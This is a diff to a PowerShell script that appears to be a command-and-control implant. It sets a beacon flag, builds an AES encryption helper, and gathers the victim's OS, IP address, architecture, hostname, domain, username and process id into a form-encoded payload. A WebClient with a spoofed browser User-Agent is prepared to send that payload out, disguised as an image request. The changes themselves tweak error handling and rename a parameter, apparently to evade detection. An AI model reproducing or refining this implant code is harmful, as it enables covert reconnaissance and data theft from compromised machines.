@@ -1,6 +1,9 @@
 $beacon=1
 function CAM ($key,$IV){
-try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
+try {
+try{$a = New-Object "System.Security.Cryptography.RijndaelManaged"
+}
+catch{}
 } catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
 $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
@@ -90,7 +93,7 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 $IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
 $random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 $agent="$random-img.jpeg"
-$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid&resource=$agent"
+$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid&image=$agent"
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
       $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
